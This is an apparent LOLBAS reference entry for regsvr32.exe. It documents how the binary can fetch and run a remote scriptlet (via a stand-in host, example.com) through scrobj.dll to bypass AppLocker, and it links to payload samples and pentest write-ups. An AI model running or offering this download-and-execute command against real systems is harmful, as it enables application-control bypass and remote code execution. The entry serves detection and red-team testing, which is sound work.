## Regsvr32.exe
  
* Functions: Execute

```
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll    
    
regsvr32.exe /s /u /i:file.sct scrobj.dll     
```
   
Acknowledgements:
* Casey Smith - @subtee
   
Code sample:
* [Regsvr32_calc.sct](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payloads/Regsvr32_calc.sct)[1]

Resources:
* https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
* https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
* https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/

Full path:
```
C:\Windows\System32\regsvr32.exe
C:\Windows\SysWOW64\regsvr32.exe
```

Notes:
[1]Code sample linked to Red Canary - Atomic Red Team


 

   
   